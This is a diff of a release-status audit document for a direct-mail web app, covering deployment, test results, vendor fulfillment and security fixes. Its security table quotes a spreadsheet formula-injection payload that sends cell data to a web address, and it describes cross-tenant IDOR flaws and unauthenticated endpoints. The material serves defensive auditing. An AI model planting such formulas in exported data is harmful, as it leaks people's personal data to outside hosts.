@@ -1,16 +1,47 @@
 # YLS Implementation Status — Codebase-vs-Docs Audit
 
-**Date:** 2026-07-31 · **Branch:** `develop` · **Method:** evidence-gated code
-verification (3 parallel audit agents: full codebase inventory, planned-feature
-extraction from the April-2025 dev-docs, factual-claim extraction from the
-technical docs), reconciled against the two prior audits
-(`docs/temp/yls-feature-audit-report.md` 2026-06-12,
+**Date:** 2026-08-02 (release update; base audit 2026-07-31) · **Branch:**
+`main` — see §0 · **Method:** evidence-gated code verification (3 parallel audit
+agents: full codebase inventory, planned-feature extraction from the April-2025
+dev-docs, factual-claim extraction from the technical docs), reconciled against
+the two prior audits (`docs/temp/yls-feature-audit-report.md` 2026-06-12,
 `docs/temp/reports/feature-completeness-report-2026-06-14.md`) with every
 previously-open gap re-verified directly in code this session.
 
 **This file is the authoritative "what is actually built" document.** Every
 other file in `dev-docs/` is an April/August-2025 planning baseline and carries
 a staleness banner pointing here. Ground truth = code, never doc checkboxes.
+
+---
+
+## 0. Production release status (2026-08-02)
+
+**The vendor fulfillment loop is LIVE.** `develop` merged to `main` (`1cbc0ee`)
+and deployed to `app.yellowlettershop.com`. Before that merge, the three pending
+migrations were applied to the hosted Supabase project (`lmtpfgfulkynrktdkgpu`):
+`20260801000000_orders_refund_columns`, `20260801010000_order_dispatches`,
+`20260801020000_dispatch_uniqueness_and_payment_status`.
+
+Prior to this release `main` sat at `b6122cb` (2026-07-19) and contained **no**
+`lib/fulfillment/` at all — so everything in §3 "Vendor fulfillment", the
+inline-payment refactor, the money-moment confirmations and the PR #24 security
+fixes reached customers for the first time here. One practical consequence: the
+two vulnerabilities listed in §3b were never exposed in production, because the
+code containing them had never shipped.
+
+**Deployment identity (do not re-derive):** exactly one Vercel project serves
+this app — `yellowlettershop` / `prj_snSyPlSbgjz6sd6hql7JTdfm9mt2` under team
+`team_9aYvnhHwLiazNz7OoE8BsRVC` (slug `robs-projects-c72886ba`), which owns
+`app.yellowlettershop.com` and matches `.vercel/project.json`. Two decoy
+projects (a domain-less `yls`, and a second `yellowlettershop` on a separate
+account) were deleted 2026-08-02 after they published the *same*
+`Vercel – yellowlettershop` GitHub status context and overwrote each other,
+making the check flip green/red for identical code. Commit statuses at or
+before `dca90eb` still show a frozen `Vercel – yls: failure` — immutable
+history, not a live signal.
+
+`main` tracks production and lags `develop` by design (`develop` → `main` only
+for releases), so a stale live site is expected between releases, not a fault.
 
 ---
 
@@ -30,19 +61,24 @@ These overrule anything else in `dev-docs/` (detail:
 | Repo `yellow-letter-shop`, main-only branching | Repo folder `yls`, `develop` branch workflow; `package.json` name is still `my-v0-project` (scaffold leftover) |
 | MelissaData vs AccuZip provider confusion | AccuZip = validation + count/search; Melissa = list-build data source (client exists, purchase flow not built) |
 
-## 2. Verification gates (this session, develop)
+## 2. Verification gates (2026-08-02, run on the merged `main` tree)
 
 | Gate | Result |
 |---|---|
-| `npm test` (Mocha) | **199 passing, 0 failing** |
-| `npm run typecheck:full` | **0 errors** (2 regressions from the June zero-baseline found and fixed this session) |
+| `npm test` (Mocha) | **269 passing, 0 failing** (199 at the 2026-07-31 audit) |
+| `npm run typecheck:full` | **0 errors** |
 | `npm run build` | **exit 0** |
+| CI unit tests | green on **both** ubuntu-latest and windows-latest |
 | `npm run lint` | ~743 pre-existing errors repo-wide — known debt, own backlog ticket (`memory:project_lint_debt_cleanup`); delta-gate model in use |
 
-Scale (inventoried 2026-07-31): 34 page routes · 113 API route files ·
-483 component files · 110 lib modules · 42 hooks · 34 migrations creating
-46 tables + 31 functions/RPCs with 84 RLS policies · 32 Mocha test files +
-9 SQL assertion tests (`supabase/tests/`).
+These were re-run on the post-merge `main` tree rather than carried over from
+`develop`, so they describe what is actually deployed.
+
+Scale (re-counted 2026-08-02): 34 page routes · 113 API route files ·
+484 component files · 119 lib modules · 42 hooks · **37 migrations** ·
+**48 public tables** in the hosted project · 31 functions/RPCs with 84 RLS
+policies · **38 Mocha test files** + 9 SQL assertion tests
+(`supabase/tests/`).
 
 ---
 
@@ -107,13 +143,14 @@ capture (D9). Backend verified end-to-end for a brand-new customer incl. the
 declined-card path; the Element's visual mount is not browser-verified (local
 CDP failure — see §7).
 
-### Vendor fulfillment (2026-07-31)
+### Vendor fulfillment (2026-07-31, shipped to production 2026-08-02)
 - **Dispatch loop**: proof approval → capture → **auto-dispatch to a print
   vendor** → vendor emailed the approved proof + recipient CSV (7-day signed
   links, private bucket) → admin advances accepted → in production → mailed
   (with tracking) → delivered → order reaches `completed`, customer emailed on
-  ship. `lib/fulfillment/` (pure `dispatch-core` + IO `dispatch-service`),
-  `order_dispatches` table (`20260801010000`), admin API
+  ship. `lib/fulfillment/` (8 modules: pure `dispatch-core` + IO
+  `dispatch-service`, `dispatch-recipients`, `dispatch-status`, plus the
+  Redstone trio), `order_dispatches` table (`20260801010000`), admin API
   `app/api/admin/orders/[orderId]/dispatch/`, panel
   `components/admin/orders/order-dispatch-panel.tsx`
 - **Inline-payment model completed**: `payment_transactions` (which no
@@ -122,7 +159,37 @@ CDP failure — see §7).
   `20260801000000` added `captured_at`/`amount_refunded`/`refunded_at` + the
   missing `cancelled` status
 - **Vendor directory** (`lib/vendors/vendor-directory.ts`) targeting the real
-  `vendors` schema; `/api/vendors` is now authenticated (was open CRUD)
+  `vendors` schema; `/api/vendors` is now authenticated (was open CRUD).
+  Per owner decision the **entire vendor API surface is admin-only** — vendor
+  contact info and wholesale pricing are operational data no customer needs
+- **Concurrency**: one live dispatch per order enforced by the DB
+  (`uq_order_dispatches_live`, partial unique index where `status <> 'failed'`);
+  `updateDispatchStatus` does a compare-and-swap on the status it read, so two
+  concurrent admin PATCHes cannot both send the customer a "shipped" email
+
+### Money-moment confirmations (2026-08-01)
+Both points where money moves now sit behind an explicit confirmation with the
+amount as the visual hero — `components/orders/confirm-action-dialog.tsx`,
+used by `PaymentStep` (authorize the hold) and `app/orders/[orderId]/page.tsx`
+(approve → capture, styled `commit`; reject → release). Previously capture had
+**no** confirmation at all and reject used a bare `window.confirm` — backwards
+relative to the risk. The review step's approval was also collapsed from four
+checkboxes the UI demanded but the gate did not enforce, down to two that are
+genuinely enforced by `validateCurrentStep` (`types/orders.ts:OrderApproval`).
+
+### 3b. Security + money fixes from the PR #24 ultrareview (2026-08-02)
+Eight review findings, each re-verified against the code before acting, plus a
+ninth found while fixing them. None had ever reached production (see §0).
+
+| Fix | What it was |
+|---|---|
+| **Cross-tenant PII (IDOR)** | `loadRecipients` read `mailing_list_records` by a customer-supplied `selectedListId` using the **service role** (RLS bypassed) with no ownership check, and `/api/orders/submit` accepts `orderState` as `z.record(z.unknown())` stored verbatim — so knowing another tenant's list UUID was enough to have their PII exported to our print vendor. Gate ported from `app/api/accuzip/upload/route.ts` into `lib/fulfillment/dispatch-recipients.ts`, keyed on the **order owner**, never the actor |
+| **CSV formula injection (CWE-1236)** | `csvCell` escaped only `",\n\r`, so `=WEBSERVICE("http://…"&B2)` in a recipient name reached the vendor's Excel and executed. `neutralizeSpreadsheetFormula` in `dispatch-core.ts`, applied in both CSV builders — in `sanitizeRedstoneCell` it must run **last**, or the existing `["',]` strip eats the guard apostrophe |
+| **Refund accounting** | `amount_refunded` was overwritten with the current refund instead of accumulated, though the column is declared cumulative — so a second partial refund erased the first and admin revenue (captured − refunded) over-reported. Pure `lib/payments/refund-core.ts` + 6 tests |
+| **Partial refund mislabelling** | Any refund set `payment_status='refunded'`, and `refundOrder` set the order to `cancelled` — so a $1 goodwill refund on a $100 order read as fully refunded **and cancelled an order that still mails**. Both now gated on `isFullRefund` |
+| Dispatch race → 500 | The 23505 loser threw a message the route's guard regex did not match, returning 500 instead of 409 |
+| `order_dispatches.package` overwrite | The Redstone leg replaced the jsonb wholesale (PostgREST does not merge), dropping the `csvPath`/`proofPath` written at insert |
+| File size | `dispatch-service.ts` was 426 lines against the ≤350 rule; split into `dispatch-recipients` + `dispatch-status` (now 264) |
 
 ### Platform services
 - Outbound transactional email: Resend-preferred/Mailgun-fallback adapter, XSS-escaped templates, wired into submit / proof-ready / captured / team-invite — `lib/email/`
@@ -187,7 +254,8 @@ CDP failure — see §7).
 
 ## 7. Known risks / hygiene (from the 2026-07-31 inventory)
 
-- **Security review candidates:** `middleware.ts` matcher covers only `/dashboard/:path*` — `/orders/*`, `/design/customize`, `/mailing-services/*` rely on client-side guards + per-route `withAuth`; `analytics/performance` trusts a `userId` query param (IDOR); several bare (unwrapped) API handlers incl. `payments/create-payment-intent`, `capture-payment`, `refund-payment`, all `mailing-lists/*`, `/api/teams/*`; shipped test/debug endpoints `api/test-db`, `api/test-db-verification`, `api/test-auth-state`, page `/test-types`.
+- **Security review candidates** (re-verified 2026-08-02): `middleware.ts` matcher covers only `/dashboard/:path*` — `/orders/*`, `/design/customize`, `/mailing-services/*` rely on client-side guards + per-route `withAuth`; `analytics/performance` trusts a `userId` query param (IDOR); bare (unwrapped) API handlers remain at `payments/create-payment-intent`, all `mailing-lists/*`, `/api/teams/*` (the bare `capture-payment` / `refund-payment` routes were **archived** to `archive/api-payments-2026-08/` and are no longer live); shipped test/debug endpoints `api/test-db`, `api/test-db-verification`, `api/test-auth-state`, page `/test-types` — **all four confirmed still present 2026-08-02 and now live in production**, which raises their priority.
+- **Dispatch auth-gate tripwire (new 2026-08-02):** the §3b ownership check requires `mailing_lists.created_by === orders.created_by` **or** a shared `team_id`. A team-shared list whose `team_id` is NULL will now be refused with "refusing to dispatch" where it previously dispatched. This is the same rule `app/api/accuzip/upload/route.ts` already enforces, so any list that validates can dispatch — but a NULL `team_id` is the first thing to check if a real dispatch starts failing.
 - **Parallel/duplicate systems to consolidate or delete:** `/api/team/*` vs `/api/teams/*`; `components/team/` vs `teams/`; `components/tags/` vs `tag-management/`; `lib/payments/payment-service.ts` vs `payment-service-new.ts`; `payments/intent` vs `create-payment-intent`; two advanced-search generations; `hooks/filters/useMailingListManager.ts` vs `use-mailing-list-manager/`; `/signup` vs `/register`; orphan `app/dashboard/users/loading.tsx`.
 - **Test coverage gaps:** designer + orders libs well covered; zero tests for list builder, media/assets, payments, admin services, campaigns, vendors, API routes, component rendering.
 - `@playwright/mcp` sits in prod `dependencies`; `@types/react` v19 vs React 18; unused jest stack.
